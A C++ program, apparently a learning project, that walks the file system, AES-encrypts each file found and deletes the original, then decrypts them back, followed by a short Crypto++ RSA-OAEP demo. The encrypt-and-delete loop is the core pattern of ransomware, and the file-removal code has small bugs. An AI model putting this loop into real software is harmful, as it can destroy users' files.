#include "cryptFile.h"
#include "traversal.h"
#include <cstdio>

int main()
{
    // encrypt files
	vector<string> en_filePaths;
    Traversal(en_filePaths,true);
    crypt_data* aesKey = generatekey();
    cout<<"Start encrpt a file...\n";
    for (int i=0; i<en_filePaths.size(); i++){
        cout<<"The file path is : "<<en_filePaths[i]<<endl;
        encrypt(aesKey, en_filePaths[i]);
        cout<< "Successfully encrypt, next remove...\n";
        if (remove(en_filePaths[i])==1) cout<< "Successfully remove\n";
    }
	cout<<"Finish all encrypt...\n";

	// decrypt files
	vector<string> de_filePaths;
    Traversal(de_filePaths,false);
	cout<<"Start decrpt a file...\n";
    for (int i=0; i<de_filePaths.size(); i++){
        cout<<"The file path is : "<<de_filePaths[i]<<endl;
        decrypt(aesKey, de_filePaths[i]);
        cout<< "Successfully decrypt, next remove...\n";
        if (remove(de_filePaths[i])==1) cout<<"Successfully remove\n";
    }
    cout<<"Finish all decrypt...\n";

    // rsa .....
    string message = "I love CoralineH";
    cout << "message = "<<message<<"\nlength = "<< message.size()<< endl;
    // Generate keys
    AutoSeededRandomPool rng;
    InvertibleRSAFunction params;
    params.GenerateRandomWithKeySize(rng, 1024);

    RSA::PrivateKey privateKey(params);
    RSA::PublicKey publicKey(params);

    string plain="RSA Encryption", cipher, recovered;
    ////////////////////////////////////////////////
    // Encryption
    RSAES_OAEP_SHA_Encryptor e(publicKey);

    StringSource ss1(message, true,
        new PK_EncryptorFilter(rng, e,
            new StringSink(cipher)
    ) // PK_EncryptorFilter
    ); // StringSource
    cout<<cipher.size()<<endl;
    ////////////////////////////////////////////////
    // Decryption
    RSAES_OAEP_SHA_Decryptor d(privateKey);

    StringSource ss2(cipher, true,
        new PK_DecryptorFilter(rng, d,
            new StringSink(recovered)
    ) // PK_DecryptorFilter
    ); // StringSource

    cout << "Recovered plain text" << endl;
    cout << recovered<<endl;

    return 0;
}
